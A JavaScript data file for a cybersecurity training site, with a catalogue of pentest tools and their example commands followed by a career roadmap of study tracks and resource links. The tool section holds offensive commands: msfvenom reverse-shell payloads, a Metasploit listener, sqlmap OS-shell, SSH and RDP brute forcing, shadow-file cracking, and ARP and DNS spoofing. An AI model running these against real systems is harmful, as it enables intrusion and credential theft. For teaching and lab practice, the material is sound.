// =============================================================================
// ROOTCRAFT — Tools & Roadmap Data
// =============================================================================

const TOOLS = [
  // ── Information Gathering ──
  {
    name: "nmap",
    cat: "Information Gathering",
    catSlug: "recon",
    icon: "fa-network-wired",
    desc: "Network discovery and security auditing. The gold standard for port scanning and service enumeration.",
    cmds: [
      { cmd: "nmap -sV -sC -T4 10.10.10.1", desc: "Version detection + default scripts" },
      { cmd: "nmap -p- --min-rate 1000 10.10.10.1", desc: "Fast full TCP port scan (all 65535)" },
      { cmd: "nmap -sU -T4 --top-ports 100 10.10.10.1", desc: "UDP scan of top 100 ports" }
    ]
  },
  {
    name: "theHarvester",
    cat: "Information Gathering",
    catSlug: "recon",
    icon: "fa-seedling",
    desc: "OSINT tool for gathering emails, subdomains, hosts, and open ports from public sources.",
    cmds: [
      { cmd: "theHarvester -d target.com -b google,bing,linkedin", desc: "Multi-source email and subdomain harvesting" },
      { cmd: "theHarvester -d target.com -b all -l 500", desc: "All sources, limit 500 results" }
    ]
  },
  {
    name: "recon-ng",
    cat: "Information Gathering",
    catSlug: "recon",
    icon: "fa-magnifying-glass",
    desc: "Full-featured modular reconnaissance framework with an interface similar to Metasploit.",
    cmds: [
      { cmd: "recon-ng -w workspace_name", desc: "Start with a named workspace" },
      { cmd: "marketplace search domains-", desc: "Search modules related to domains" },
      { cmd: "modules load recon/domains-hosts/bing_domain_web", desc: "Load Bing domain module" }
    ]
  },
  {
    name: "amass",
    cat: "Information Gathering",
    catSlug: "recon",
    icon: "fa-spider",
    desc: "In-depth attack surface mapping and asset discovery using OSINT and active recon.",
    cmds: [
      { cmd: "amass enum -d target.com -o output.txt", desc: "Passive subdomain enumeration" },
      { cmd: "amass enum -brute -d target.com -src", desc: "Brute-force with source display" }
    ]
  },
  {
    name: "shodan",
    cat: "Information Gathering",
    catSlug: "recon",
    icon: "fa-satellite-dish",
    desc: "Search engine for internet-connected devices. Find exposed servers, IoT, webcams, and more.",
    cmds: [
      { cmd: "shodan search 'apache country:US'", desc: "Search for Apache servers in the US" },
      { cmd: "shodan host 8.8.8.8", desc: "Get all info on a specific IP" },
      { cmd: "shodan stats --facets port 'org:\"Google\"'", desc: "Port distribution for an org" }
    ]
  },

  // ── Web Applications ──
  {
    name: "sqlmap",
    cat: "Web Applications",
    catSlug: "web",
    icon: "fa-database",
    desc: "Automatic SQL injection detection and database exploitation engine.",
    cmds: [
      { cmd: "sqlmap -u 'http://site.com/page?id=1' --batch --dbs", desc: "Auto-detect and list databases" },
      { cmd: "sqlmap -r request.txt -p id --dump", desc: "Test from saved HTTP request file" },
      { cmd: "sqlmap -u 'http://site.com/?id=1' --os-shell", desc: "Attempt OS command shell via SQLi" }
    ]
  },
  {
    name: "gobuster",
    cat: "Web Applications",
    catSlug: "web",
    icon: "fa-folder-open",
    desc: "High-speed Go tool for brute-forcing URIs (directories/files), DNS subdomains, and vhosts.",
    cmds: [
      { cmd: "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt", desc: "Directory brute force" },
      { cmd: "gobuster dns -d target.com -w subdomains.txt -t 50", desc: "DNS subdomain enumeration" },
      { cmd: "gobuster vhost -u http://target.com -w vhosts.txt", desc: "Virtual host discovery" }
    ]
  },
  {
    name: "nikto",
    cat: "Web Applications",
    catSlug: "web",
    icon: "fa-bug",
    desc: "Web server scanner that tests for dangerous files, outdated versions, and misconfigurations.",
    cmds: [
      { cmd: "nikto -h http://target.com", desc: "Basic web server scan" },
      { cmd: "nikto -h http://target.com -ssl -o report.html -Format htm", desc: "SSL scan with HTML report" }
    ]
  },
  {
    name: "Burp Suite",
    cat: "Web Applications",
    catSlug: "web",
    icon: "fa-crosshairs",
    desc: "Industry-leading web application security testing platform with proxy, scanner, and fuzzer.",
    cmds: [
      { cmd: "java -jar burpsuite_community.jar", desc: "Launch Burp Suite Community Edition" },
      { cmd: "curl -x http://127.0.0.1:8080 http://target.com", desc: "Route traffic through Burp proxy" }
    ]
  },
  {
    name: "ffuf",
    cat: "Web Applications",
    catSlug: "web",
    icon: "fa-bolt",
    desc: "Fast web fuzzer written in Go. Fuzz URLs, headers, POST data, and more.",
    cmds: [
      { cmd: "ffuf -w wordlist.txt -u http://target.com/FUZZ", desc: "Directory fuzzing" },
      { cmd: "ffuf -w wordlist.txt -u http://target.com -H 'Host: FUZZ.target.com'", desc: "Virtual host fuzzing" },
      { cmd: "ffuf -w params.txt -u 'http://target.com?FUZZ=test' -fs 4242", desc: "Parameter discovery, filter by size" }
    ]
  },
  {
    name: "wfuzz",
    cat: "Web Applications",
    catSlug: "web",
    icon: "fa-shuffle",
    desc: "Flexible web application fuzzer for brute-forcing parameters, paths, and authentication.",
    cmds: [
      { cmd: "wfuzz -c -w wordlist.txt --hc 404 http://target.com/FUZZ", desc: "Directory fuzzing, hide 404s" },
      { cmd: "wfuzz -c -z range,1-100 http://target.com/user?id=FUZZ", desc: "IDOR testing with range payload" }
    ]
  },
  {
    name: "dirb",
    cat: "Web Applications",
    catSlug: "web",
    icon: "fa-sitemap",
    desc: "URL brute-forcer that finds existing and hidden web objects by dictionary attack.",
    cmds: [
      { cmd: "dirb http://target.com /usr/share/wordlists/dirb/common.txt", desc: "Basic directory scan" },
      { cmd: "dirb http://target.com -a 'Mozilla/5.0' -p http://proxy:8080", desc: "With custom User-Agent and proxy" }
    ]
  },

  // ── Password Attacks ──
  {
    name: "hydra",
    cat: "Password Attacks",
    catSlug: "password",
    icon: "fa-droplet",
    desc: "Parallelized network login cracker supporting SSH, FTP, HTTP, RDP, and 50+ protocols.",
    cmds: [
      { cmd: "hydra -l admin -P rockyou.txt 10.10.10.1 ssh -t 4", desc: "SSH brute force" },
      { cmd: "hydra -L users.txt -P passwords.txt 10.10.10.1 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'", desc: "HTTP POST login brute force" },
      { cmd: "hydra -l admin -P wordlist.txt rdp://10.10.10.1", desc: "RDP password attack" }
    ]
  },
  {
    name: "john",
    cat: "Password Attacks",
    catSlug: "password",
    icon: "fa-key",
    desc: "John the Ripper — versatile offline password cracker supporting hundreds of hash types.",
    cmds: [
      { cmd: "john --wordlist=rockyou.txt hashes.txt", desc: "Dictionary attack on hash file" },
      { cmd: "john --format=raw-sha256 --show hashes.txt", desc: "Show cracked SHA-256 passwords" },
      { cmd: "unshadow /etc/passwd /etc/shadow > combined.txt && john combined.txt", desc: "Crack Linux shadow passwords" }
    ]
  },
  {
    name: "hashcat",
    cat: "Password Attacks",
    catSlug: "password",
    icon: "fa-fire",
    desc: "World's fastest GPU-accelerated password recovery tool. Supports 350+ hash types.",
    cmds: [
      { cmd: "hashcat -m 0 -a 0 hashes.txt rockyou.txt", desc: "MD5 dictionary attack" },
      { cmd: "hashcat -m 1000 -a 3 ntlm.txt '?u?l?l?l?d?d?d?s'", desc: "NTLM mask attack (Ulll000!)" },
      { cmd: "hashcat -m 3200 bcrypt.txt rockyou.txt -r rules/best64.rule", desc: "bcrypt with rule-based mutation" }
    ]
  },
  {
    name: "cewl",
    cat: "Password Attacks",
    catSlug: "password",
    icon: "fa-list",
    desc: "Custom wordlist generator that spiders a target website and extracts unique words.",
    cmds: [
      { cmd: "cewl http://target.com -d 3 -m 5 -w wordlist.txt", desc: "Spider 3 deep, min 5 char words" },
      { cmd: "cewl http://target.com --with-numbers -e", desc: "Include numbers and extract emails" }
    ]
  },

  // ── Exploitation ──
  {
    name: "metasploit",
    cat: "Exploitation",
    catSlug: "exploitation",
    icon: "fa-skull-crossbones",
    desc: "The world's most used penetration testing and exploit execution framework.",
    cmds: [
      { cmd: "msfconsole -q", desc: "Launch console quietly" },
      { cmd: "search type:exploit platform:linux apache", desc: "Search for Linux Apache exploits" },
      { cmd: "use exploit/multi/handler && set payload linux/x64/meterpreter/reverse_tcp", desc: "Set up a listener" }
    ]
  },
  {
    name: "searchsploit",
    cat: "Exploitation",
    catSlug: "exploitation",
    icon: "fa-magnifying-glass",
    desc: "Offline mirror of Exploit-DB. Search for public exploits and shellcodes from the terminal.",
    cmds: [
      { cmd: "searchsploit apache 2.4", desc: "Search exploits for Apache 2.4" },
      { cmd: "searchsploit -m 50383", desc: "Mirror (copy) exploit to current directory" },
      { cmd: "searchsploit --nmap scan-results.xml", desc: "Auto-match from Nmap XML output" }
    ]
  },
  {
    name: "msfvenom",
    cat: "Exploitation",
    catSlug: "exploitation",
    icon: "fa-syringe",
    desc: "Payload generator and encoder for Metasploit. Create reverse shells, droppers, and more.",
    cmds: [
      { cmd: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.2 LPORT=4444 -f elf > shell.elf", desc: "Linux reverse shell binary" },
      { cmd: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.2 LPORT=4444 -f exe > shell.exe", desc: "Windows Meterpreter executable" },
      { cmd: "msfvenom -p php/reverse_php LHOST=10.10.10.2 LPORT=4444 -o shell.php", desc: "PHP reverse shell script" }
    ]
  },

  // ── Network & Sniffing ──
  {
    name: "wireshark",
    cat: "Network & Sniffing",
    catSlug: "sniffing",
    icon: "fa-wave-square",
    desc: "Network protocol analyzer for deep packet inspection, troubleshooting, and traffic analysis.",
    cmds: [
      { cmd: "tshark -i eth0 -f 'tcp port 80' -w capture.pcap", desc: "Capture HTTP traffic to file" },
      { cmd: "tshark -r capture.pcap -Y 'http.request.method == POST'", desc: "Filter POST requests from pcap" },
      { cmd: "tshark -r capture.pcap -T fields -e http.host -e http.request.uri", desc: "Extract URLs from capture" }
    ]
  },
  {
    name: "tcpdump",
    cat: "Network & Sniffing",
    catSlug: "sniffing",
    icon: "fa-terminal",
    desc: "Lightweight command-line packet analyzer for capturing and filtering network traffic.",
    cmds: [
      { cmd: "tcpdump -i eth0 -nn -X port 80", desc: "Capture HTTP with hex/ASCII dump" },
      { cmd: "tcpdump -i any -w dump.pcap -c 1000", desc: "Save 1000 packets to file" },
      { cmd: "tcpdump -r dump.pcap 'src host 10.10.10.1 and tcp'", desc: "Read pcap with source filter" }
    ]
  },
  {
    name: "ettercap",
    cat: "Network & Sniffing",
    catSlug: "sniffing",
    icon: "fa-network-wired",
    desc: "Comprehensive MITM attack suite for LAN sniffing, ARP poisoning, and packet manipulation.",
    cmds: [
      { cmd: "ettercap -T -M arp:remote /10.10.10.1// /10.10.10.254//", desc: "ARP MITM between host and gateway" },
      { cmd: "ettercap -T -i eth0 -P dns_spoof", desc: "DNS spoofing plugin" }
    ]
  },
  {
    name: "bettercap",
    cat: "Network & Sniffing",
    catSlug: "sniffing",
    icon: "fa-wifi",
    desc: "Swiss Army knife for network recon and MITM attacks. Modern successor to ettercap.",
    cmds: [
      { cmd: "bettercap -iface eth0", desc: "Start interactive session on eth0" },
      { cmd: "net.probe on && net.sniff on", desc: "Probe and sniff network (inside bettercap)" },
      { cmd: "set arp.spoof.targets 10.10.10.1 && arp.spoof on", desc: "ARP spoof a target" }
    ]
  },

  // ── Wireless ──
  {
    name: "aircrack-ng",
    cat: "Wireless",
    catSlug: "wireless",
    icon: "fa-tower-broadcast",
    desc: "Complete suite for 802.11 wireless security: monitoring, attacking, testing, and cracking.",
    cmds: [
      { cmd: "airmon-ng start wlan0", desc: "Enable monitor mode" },
      { cmd: "airodump-ng wlan0mon", desc: "Discover nearby wireless networks" },
      { cmd: "aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF capture.cap", desc: "Crack WPA handshake" }
    ]
  },
  {
    name: "wifite",
    cat: "Wireless",
    catSlug: "wireless",
    icon: "fa-signal",
    desc: "Automated wireless attack tool. Automates the aircrack-ng workflow for WEP/WPA/WPS.",
    cmds: [
      { cmd: "wifite --kill", desc: "Auto-attack all targets, kill conflicting processes" },
      { cmd: "wifite -wpa -dict rockyou.txt", desc: "Target only WPA networks with dictionary" }
    ]
  }
];

// =============================================================================
// CYBERSECURITY CAREER ROADMAP — 12 Tracks
// =============================================================================

const ROADMAP = [
  // ── 1. SOC Analyst (Blue Team) ──
  {
    id: "soc-analyst",
    title: "SOC Analyst (Blue Team)",
    icon: "fa-shield-halved",
    color: "#3b82f6",
    difficulty: "Beginner → Intermediate",
    description: "Security Operations Center analysts monitor, detect, and respond to security incidents in real time. Progress from L1 alert triage through L2 investigation to L3 threat hunting.",
    prerequisites: ["Networking basics (TCP/IP, DNS, HTTP)", "Operating system fundamentals", "Basic command line skills"],
    certifications: ["CompTIA Security+", "CompTIA CySA+", "Splunk Core Certified User", "SC-200 (Microsoft)", "BTL1 (Blue Team Level 1)"],
    phases: [
      {
        name: "L1 — Alert Triage & Monitoring",
        topics: ["SIEM fundamentals (log ingestion, correlation)", "Alert triage and prioritization", "Log analysis (Windows Event Logs, Syslog)", "Ticketing systems and incident documentation", "Basic malware indicators (IOCs)", "Network traffic baseline understanding"],
        tools: ["Splunk", "ELK Stack (Elasticsearch, Logstash, Kibana)", "QRadar", "Wazuh", "Wireshark"],
        resources: [
          { name: "TryHackMe — SOC Level 1 Path", url: "https://tryhackme.com/path/outline/soclevel1", free: true },
          { name: "LetsDefend — SOC Analyst Training", url: "https://letsdefend.io/", free: true },
          { name: "Splunk Free Training", url: "https://www.splunk.com/en_us/training/free-courses.html", free: true },
          { name: "Professor Messer — Security+ Course", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/sy0-701-comptia-security-plus-course/", free: true }
        ]
      },
      {
        name: "L2 — Incident Investigation",
        topics: ["Deep packet analysis", "Endpoint Detection & Response (EDR)", "MITRE ATT&CK framework mapping", "Incident response playbooks", "Phishing analysis and email headers", "Threat intelligence feeds"],
        tools: ["CrowdStrike Falcon", "Carbon Black", "MITRE ATT&CK Navigator", "VirusTotal", "PhishTool", "YARA rules"],
        resources: [
          { name: "TryHackMe — SOC Level 2 Path", url: "https://tryhackme.com/path/outline/soclevel2", free: true },
          { name: "MITRE ATT&CK Official Site", url: "https://attack.mitre.org/", free: true },
          { name: "Blue Team Labs Online", url: "https://blueteamlabs.online/", free: true },
          { name: "CyberDefenders — Blue Team CTF", url: "https://cyberdefenders.org/", free: true }
        ]
      },
      {
        name: "L3 — Threat Hunting & Automation",
        topics: ["Proactive threat hunting hypotheses", "SOAR platform automation", "Advanced persistent threat (APT) analysis", "Custom detection rule writing (Sigma, YARA)", "Threat intelligence platforms (TIPs)", "Purple teaming methodology"],
        tools: ["Sigma Rules", "YARA", "TheHive", "Cortex XSOAR", "OpenCTI", "Velociraptor"],
        resources: [
          { name: "SANS Cyber Aces — Free Courses", url: "https://www.cyberaces.org/", free: true },
          { name: "Sigma Rules Repository", url: "https://github.com/SigmaHQ/sigma", free: true },
          { name: "Active Countermeasures — Threat Hunting", url: "https://www.activecountermeasures.com/hunt-training/", free: true }
        ]
      }
    ]
  },

  // ── 2. Penetration Tester (Red Team) ──
  {
    id: "pentester",
    title: "Penetration Tester (Red Team)",
    icon: "fa-crosshairs",
    color: "#ef4444",
    difficulty: "Intermediate → Advanced",
    description: "Penetration testers simulate real-world attacks to find vulnerabilities before malicious actors do. Master the full kill chain from reconnaissance to reporting.",
    prerequisites: ["Linux command line proficiency", "Networking (TCP/IP, subnetting)", "Basic scripting (Python/Bash)", "Web fundamentals (HTTP, HTML, JS)"],
    certifications: ["OSCP (Offensive Security)", "eJPT (INE)", "PNPT (TCM Security)", "CEH (EC-Council)", "GPEN (SANS)"],
    phases: [
      {
        name: "Phase 1: Reconnaissance",
        topics: ["Passive OSINT gathering", "DNS enumeration and zone transfers", "Google dorking and search engine recon", "Subdomain and email discovery", "Social engineering reconnaissance", "Shodan and Censys scanning"],
        tools: ["theHarvester", "Amass", "Sublist3r", "Maltego", "Shodan", "recon-ng"],
        resources: [
          { name: "TryHackMe — Jr Penetration Tester", url: "https://tryhackme.com/path/outline/jrpenetrationtester", free: true },
          { name: "TCM Security — Practical Ethical Hacking", url: "https://academy.tcm-sec.com/", free: false },
          { name: "HackTheBox Academy — Penetration Tester Path", url: "https://academy.hackthebox.com/", free: true },
          { name: "NetworkChuck — Ethical Hacking Course", url: "https://www.youtube.com/c/NetworkChuck", free: true }
        ]
      },
      {
        name: "Phase 2: Scanning & Enumeration",
        topics: ["Port scanning techniques", "Service version fingerprinting", "SMB, LDAP, SNMP enumeration", "Web application scanning", "Vulnerability assessment", "Active Directory enumeration"],
        tools: ["Nmap", "Masscan", "enum4linux", "Gobuster", "Nikto", "BloodHound"],
        resources: [
          { name: "Nmap Official Documentation", url: "https://nmap.org/book/", free: true },
          { name: "IppSec YouTube — HackTheBox Walkthroughs", url: "https://www.youtube.com/c/ippsec", free: true },
          { name: "HackTheBox — Starting Point Machines", url: "https://www.hackthebox.com/", free: true }
        ]
      },
      {
        name: "Phase 3: Exploitation",
        topics: ["Web application attacks (SQLi, XSS, SSRF)", "Network service exploitation", "Password attacks and credential stuffing", "Client-side attacks", "Buffer overflow basics", "Active Directory attacks (Kerberoasting, Pass-the-Hash)"],
        tools: ["Metasploit", "Burp Suite", "sqlmap", "CrackMapExec", "Impacket", "Responder"],
        resources: [
          { name: "PortSwigger Web Security Academy", url: "https://portswigger.net/web-security", free: true },
          { name: "OWASP WebGoat", url: "https://owasp.org/www-project-webgoat/", free: true },
          { name: "VulnHub — Vulnerable VMs", url: "https://www.vulnhub.com/", free: true }
        ]
      },
      {
        name: "Phase 4: Post-Exploitation & Privesc",
        topics: ["Linux privilege escalation (SUID, sudo, cron)", "Windows privilege escalation (services, tokens)", "Lateral movement techniques", "Pivoting and tunneling", "Data exfiltration", "Persistence mechanisms"],
        tools: ["LinPEAS", "WinPEAS", "Chisel", "Ligolo-ng", "Mimikatz", "PowerView"],
        resources: [
          { name: "GTFOBins — Unix Binaries for Privesc", url: "https://gtfobins.github.io/", free: true },
          { name: "LOLBAS — Living Off The Land Binaries", url: "https://lolbas-project.github.io/", free: true },
          { name: "TryHackMe — Linux PrivEsc Room", url: "https://tryhackme.com/room/linprivesc", free: true }
        ]
      },
      {
        name: "Phase 5: Reporting",
        topics: ["Executive summary writing", "CVSS scoring and risk rating", "Proof of concept documentation", "Remediation recommendations", "Professional report structure", "Communicating risk to stakeholders"],
        tools: ["Ghostwriter", "Dradis", "PlexTrac", "Markdown/LaTeX"],
        resources: [
          { name: "TCM Security — Report Writing for Pentesters", url: "https://academy.tcm-sec.com/", free: false },
          { name: "OSCP Report Templates", url: "https://github.com/noraj/OSCP-Exam-Report-Template-Markdown", free: true }
        ]
      }
    ]
  },

  // ── 3. Application Security (AppSec) ──
  {
    id: "appsec",
    title: "Application Security (AppSec)",
    icon: "fa-code",
    color: "#f97316",
    difficulty: "Intermediate → Advanced",
    description: "Application security engineers build secure software and find vulnerabilities through code review, testing, and threat modeling. Bridge the gap between dev and security.",
    prerequisites: ["Programming (Python, JavaScript, Java, or Go)", "Web development fundamentals", "HTTP/REST API knowledge", "Basic security concepts"],
    certifications: ["OSWE (Offensive Security)", "GWEB (SANS)", "CSSLP (ISC²)", "CASE (EC-Council)"],
    phases: [
      {
        name: "Phase 1: OWASP & Web Vulnerabilities",
        topics: ["OWASP Top 10 deep dive", "SQL Injection and prevention", "Cross-Site Scripting (XSS) types", "Cross-Site Request Forgery (CSRF)", "Insecure Direct Object References (IDOR)", "Server-Side Request Forgery (SSRF)"],
        tools: ["Burp Suite", "OWASP ZAP", "SQLMap", "XSStrike", "Postman"],
        resources: [
          { name: "PortSwigger Web Security Academy", url: "https://portswigger.net/web-security", free: true },
          { name: "OWASP Top 10 Official", url: "https://owasp.org/www-project-top-ten/", free: true },
          { name: "OWASP Juice Shop (Practice)", url: "https://owasp.org/www-project-juice-shop/", free: true },
          { name: "PentesterLab", url: "https://pentesterlab.com/", free: true }
        ]
      },
      {
        name: "Phase 2: Secure Code Review",
        topics: ["Static Application Security Testing (SAST)", "Code review methodology", "Common vulnerability patterns by language", "Authentication and session management flaws", "Input validation and output encoding", "Cryptographic misuse detection"],
        tools: ["Semgrep", "SonarQube", "CodeQL", "Bandit (Python)", "ESLint Security"],
        resources: [
          { name: "OWASP Code Review Guide", url: "https://owasp.org/www-project-code-review-guide/", free: true },
          { name: "Semgrep Tutorial", url: "https://semgrep.dev/learn", free: true },
          { name: "Secure Code Warrior", url: "https://www.securecodewarrior.com/", free: false }
        ]
      },
      {
        name: "Phase 3: API Security & Threat Modeling",
        topics: ["OWASP API Security Top 10", "JWT vulnerabilities and best practices", "OAuth 2.0 / OpenID Connect security", "GraphQL security", "Threat modeling with STRIDE / DREAD", "Security architecture review"],
        tools: ["Postman", "Swagger/OpenAPI", "OWASP Threat Dragon", "Microsoft Threat Modeling Tool"],
        resources: [
          { name: "OWASP API Security Top 10", url: "https://owasp.org/www-project-api-security/", free: true },
          { name: "API Security University", url: "https://university.apisec.ai/", free: true },
          { name: "OWASP Threat Dragon", url: "https://owasp.org/www-project-threat-dragon/", free: true }
        ]
      }
    ]
  },

  // ── 4. Cloud Security ──
  {
    id: "cloud-security",
    title: "Cloud Security",
    icon: "fa-cloud",
    color: "#06b6d4",
    difficulty: "Intermediate → Advanced",
    description: "Secure cloud infrastructure across AWS, Azure, and GCP. Master IAM, compliance, container security, and cloud-native defense strategies.",
    prerequisites: ["Cloud fundamentals (any provider)", "Networking basics", "Linux administration", "Infrastructure as Code concepts"],
    certifications: ["AWS Security Specialty", "AZ-500 (Azure Security)", "GCP Professional Cloud Security Engineer", "CCSK (CSA)", "CCSP (ISC²)"],
    phases: [
      {
        name: "Phase 1: Cloud Foundations & IAM",
        topics: ["Shared responsibility model", "Identity and Access Management (IAM)", "Least privilege and role-based access", "Multi-Factor Authentication (MFA)", "Service accounts and key management", "Cloud logging and monitoring"],
        tools: ["AWS IAM", "Azure Active Directory", "GCP IAM", "CloudTrail", "Azure Monitor"],
        resources: [
          { name: "AWS Free Tier + Training", url: "https://aws.amazon.com/training/", free: true },
          { name: "Microsoft Learn — AZ-500", url: "https://learn.microsoft.com/en-us/certifications/azure-security-engineer/", free: true },
          { name: "GCP Security Fundamentals", url: "https://cloud.google.com/training/security", free: true }
        ]
      },
      {
        name: "Phase 2: Cloud Offensive Security",
        topics: ["Cloud misconfiguration scanning", "S3 bucket enumeration and exploitation", "Metadata service attacks (SSRF to IMDS)", "Privilege escalation in cloud IAM", "Serverless function vulnerabilities", "Cloud penetration testing methodology"],
        tools: ["ScoutSuite", "Prowler", "CloudGoat", "Pacu", "CloudFox", "Trivy"],
        resources: [
          { name: "CloudGoat — Vulnerable AWS by Design", url: "https://github.com/RhinoSecurityLabs/cloudgoat", free: true },
          { name: "Hacking the Cloud", url: "https://hackingthe.cloud/", free: true },
          { name: "flaws.cloud — AWS CTF", url: "http://flaws.cloud/", free: true }
        ]
      },
      {
        name: "Phase 3: Container & Kubernetes Security",
        topics: ["Docker security best practices", "Kubernetes RBAC and network policies", "Container image scanning", "Pod security standards", "Service mesh security (Istio)", "Runtime threat detection"],
        tools: ["Falco", "Trivy", "kube-bench", "OPA/Gatekeeper", "Aqua Security", "Sysdig"],
        resources: [
          { name: "Kubernetes Security Docs", url: "https://kubernetes.io/docs/concepts/security/", free: true },
          { name: "KillerCoda — Kubernetes Labs", url: "https://killercoda.com/", free: true },
          { name: "Container Security by Liz Rice (Book)", url: "https://www.oreilly.com/library/view/container-security/9781492056690/", free: false }
        ]
      }
    ]
  },

  // ── 5. Network Security ──
  {
    id: "network-security",
    title: "Network Security",
    icon: "fa-network-wired",
    color: "#8b5cf6",
    difficulty: "Beginner → Advanced",
    description: "Design, implement, and defend secure network architectures. Master firewalls, IDS/IPS, VPNs, and Zero Trust principles.",
    prerequisites: ["TCP/IP networking", "OSI model understanding", "Basic routing and switching", "Linux/Windows administration"],
    certifications: ["CompTIA Network+", "CompTIA Security+", "CCNA Security", "Palo Alto PCNSA", "Fortinet NSE"],
    phases: [
      {
        name: "Phase 1: Network Fundamentals & Defense",
        topics: ["TCP/IP deep dive and packet analysis", "Firewall rules and ACLs", "IDS/IPS configuration (Snort, Suricata)", "VPN technologies (IPSec, WireGuard, OpenVPN)", "Network segmentation and VLANs", "DNS security (DNSSEC, DNS-over-HTTPS)"],
        tools: ["Wireshark", "Snort", "Suricata", "pfSense", "iptables/nftables"],
        resources: [
          { name: "David Bombal — Networking Course", url: "https://www.youtube.com/c/DavidBombal", free: true },
          { name: "Professor Messer — Network+", url: "https://www.professormesser.com/network-plus/n10-009/n10-009-video/n10-009-training-course/", free: true },
          { name: "Cisco Networking Academy", url: "https://www.netacad.com/", free: true }
        ]
      },
      {
        name: "Phase 2: Advanced Network Defense",
        topics: ["Zero Trust Architecture", "Network Access Control (NAC)", "802.1X authentication", "SDN and micro-segmentation", "DDoS mitigation strategies", "Network forensics and traffic analysis"],
        tools: ["Zeek (Bro)", "NetworkMiner", "Arkime (Moloch)", "PolarProxy", "GRR Rapid Response"],
        resources: [
          { name: "NIST Zero Trust Architecture (SP 800-207)", url: "https://csrc.nist.gov/publications/detail/sp/800-207/final", free: true },
          { name: "Zeek Documentation", url: "https://docs.zeek.org/en/current/", free: true },
          { name: "Malware Traffic Analysis", url: "https://www.malware-traffic-analysis.net/", free: true }
        ]
      }
    ]
  },

  // ── 6. Digital Forensics & Incident Response (DFIR) ──
  {
    id: "dfir",
    title: "Digital Forensics & Incident Response",
    icon: "fa-fingerprint",
    color: "#ec4899",
    difficulty: "Intermediate → Advanced",
    description: "Investigate security breaches, recover evidence, and respond to incidents. Master disk, memory, and network forensics with legal defensibility.",
    prerequisites: ["Operating systems internals", "File systems (NTFS, ext4)", "Networking fundamentals", "Command line proficiency"],
    certifications: ["GCIH (SANS)", "GCFE (SANS)", "CHFI (EC-Council)", "EnCE", "OSDA (Offensive Security)"],
    phases: [
      {
        name: "Phase 1: Incident Response Foundations",
        topics: ["NIST Incident Response lifecycle", "Evidence preservation and chain of custody", "Triage methodology and scoping", "Log analysis (Windows Event Logs, Syslog)", "Timeline analysis", "Indicators of Compromise (IOC) hunting"],
        tools: ["KAPE", "Velociraptor", "CyLR", "Event Log Explorer", "Chainsaw"],
        resources: [
          { name: "TryHackMe — DFIR Path", url: "https://tryhackme.com/", free: true },
          { name: "SANS DFIR Cheat Sheets", url: "https://www.sans.org/posters/", free: true },
          { name: "13Cubed YouTube — DFIR Tutorials", url: "https://www.youtube.com/c/13Cubed", free: true }
        ]
      },
      {
        name: "Phase 2: Disk & Memory Forensics",
        topics: ["Disk imaging and verification (dd, FTK Imager)", "File system analysis and artifact recovery", "Registry forensics (Windows)", "Browser artifact analysis", "Memory acquisition and analysis", "Deleted file and slack space recovery"],
        tools: ["Autopsy", "FTK Imager", "Volatility 3", "AXIOM", "RegRipper", "Bulk Extractor"],
        resources: [
          { name: "Autopsy Digital Forensics (Free Tool)", url: "https://www.autopsy.com/", free: true },
          { name: "Volatility Foundation", url: "https://www.volatilityfoundation.org/", free: true },
          { name: "Digital Forensics with Kali Linux (Book)", url: "https://www.packtpub.com/", free: false }
        ]
      },
      {
        name: "Phase 3: Network Forensics & Malware Triage",
        topics: ["PCAP analysis and reconstruction", "Network flow analysis", "Command & Control (C2) detection", "Initial malware triage (not full analysis)", "Threat intelligence integration", "Report writing for legal proceedings"],
        tools: ["Wireshark", "Zeek", "NetworkMiner", "RITA", "Cuckoo Sandbox", "PEStudio"],
        resources: [
          { name: "CyberDefenders — Forensics Challenges", url: "https://cyberdefenders.org/", free: true },
          { name: "Malware Traffic Analysis — PCAPs", url: "https://www.malware-traffic-analysis.net/", free: true },
          { name: "SANS FOR508 Resources", url: "https://www.sans.org/cyber-security-courses/advanced-incident-response-threat-hunting-training/", free: false }
        ]
      }
    ]
  },

  // ── 7. Malware Analysis & Reverse Engineering ──
  {
    id: "malware-re",
    title: "Malware Analysis & Reverse Engineering",
    icon: "fa-bug",
    color: "#f43f5e",
    difficulty: "Advanced",
    description: "Analyze malicious software to understand its behavior, capabilities, and origin. Master static analysis, dynamic analysis, and assembly-level reverse engineering.",
    prerequisites: ["C/C++ programming", "Assembly language basics (x86)", "Operating system internals", "Networking protocols"],
    certifications: ["GREM (SANS)", "OSRA (Offensive Security)", "eCMAP (INE)", "CREA"],
    phases: [
      {
        name: "Phase 1: Static Analysis",
        topics: ["PE/ELF file format analysis", "String extraction and analysis", "Import/export table analysis", "Packer and obfuscation detection", "YARA rule writing", "Hashing and signature analysis"],
        tools: ["PEStudio", "Detect It Easy (DIE)", "YARA", "strings", "file", "ssdeep"],
        resources: [
          { name: "Practical Malware Analysis (Book)", url: "https://nostarch.com/malware", free: false },
          { name: "MalwareBazaar — Samples", url: "https://bazaar.abuse.ch/", free: true },
          { name: "OpenSecurityTraining2 — Malware Analysis", url: "https://opensecuritytraining.info/", free: true }
        ]
      },
      {
        name: "Phase 2: Dynamic Analysis",
        topics: ["Sandbox analysis setup", "API monitoring and hooking", "Network traffic analysis during execution", "Registry and filesystem monitoring", "Process injection detection", "Anti-analysis technique identification"],
        tools: ["ANY.RUN", "Cuckoo Sandbox", "Process Monitor", "Regshot", "Fakenet-NG", "x64dbg"],
        resources: [
          { name: "ANY.RUN — Interactive Sandbox", url: "https://any.run/", free: true },
          { name: "Joe Sandbox Community", url: "https://www.joesandbox.com/", free: true },
          { name: "John Hammond — Malware Analysis Videos", url: "https://www.youtube.com/c/JohnHammond010", free: true }
        ]
      },
      {
        name: "Phase 3: Disassembly & Decompilation",
        topics: ["x86/x64 assembly language", "Control flow graph analysis", "Function identification and renaming", "Data structure reconstruction", "Anti-debugging and anti-VM techniques", "Shellcode analysis"],
        tools: ["Ghidra", "IDA Free", "x64dbg", "Binary Ninja", "Cutter (Rizin)", "dnSpy (.NET)"],
        resources: [
          { name: "Ghidra Courses — NSA", url: "https://ghidra.re/courses/", free: true },
          { name: "Reverse Engineering for Beginners", url: "https://beginners.re/", free: true },
          { name: "Crackmes.one — RE Practice", url: "https://crackmes.one/", free: true }
